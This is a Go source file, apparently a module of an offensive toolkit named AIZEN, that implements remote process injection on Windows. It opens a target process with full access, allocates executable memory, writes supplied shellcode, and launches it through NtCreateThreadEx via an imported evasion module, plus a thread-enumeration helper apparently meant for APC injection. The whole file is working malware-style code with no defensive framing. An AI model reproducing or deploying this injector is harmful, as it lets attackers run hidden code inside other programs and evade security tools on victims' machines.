package inject

import (
	"log"
	"syscall"
	"unsafe"

	"AIZEN/cmd/modules/evade"
)

var (
	kernel32          = syscall.NewLazyDLL("kernel32.dll")
	ntdll             = syscall.NewLazyDLL("ntdll.dll")
	VirtualAllocEx    = kernel32.NewProc("VirtualAllocEx")
	WriteProcessMem  = kernel32.NewProc("WriteProcessMemory")
	OpenProcess      = kernel32.NewProc("OpenProcess")
	CloseHandle      = kernel32.NewProc("CloseHandle")
	QueueUserAPC     = kernel32.NewProc("QueueUserAPC")
	OpenThread       = kernel32.NewProc("OpenThread")
	CreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	Thread32First    = kernel32.NewProc("Thread32First")
	Thread32Next     = kernel32.NewProc("Thread32Next")
)

func InjectRemote(pid uint32, shellcode []byte) error {
	proc, err := evade.OpenProcess(0x1F0FFF, false, pid)
	if err != nil {
		return err
	}
	defer syscall.CloseHandle(proc)

	addr, err := evade.VirtualAllocEx(proc, 0, len(shellcode), 0x3000, 0x40)
	if err != nil {
		return err
	}

	if err := evade.WriteProcessMemory(proc, addr, shellcode); err != nil {
		return err
	}

	thread, err := evade.NtCreateThreadEx(proc, addr, 0)
	if err != nil {
		return err
	}
	defer syscall.CloseHandle(thread)

	log.Printf("[+] injected into PID %d", pid)
	return nil
}

func enumerateThreads(pid uint32) []uint32 {
	var threads []uint32
	snapshot, _, _ := CreateToolhelp32Snapshot.Call(0x00000004, uintptr(pid))
	if snapshot == 0 {
		return threads
	}
	defer CloseHandle.Call(snapshot)

	var entry struct {
		Size           uint32
		Usage          uint32
		ThreadID       uint32
		OwnerProcessID uint32
		BasePriority   int32
		DeltaPriority  int32
		Flags          uint32
	}
	entry.Size = uint32(unsafe.Sizeof(entry))

	ret, _, _ := Thread32First.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	for ret != 0 {
		if entry.OwnerProcessID == pid {
			threads = append(threads, entry.ThreadID)
		}
		ret, _, _ = Thread32Next.Call(snapshot, uintptr(unsafe.Pointer(&entry)))
	}
	return threads
}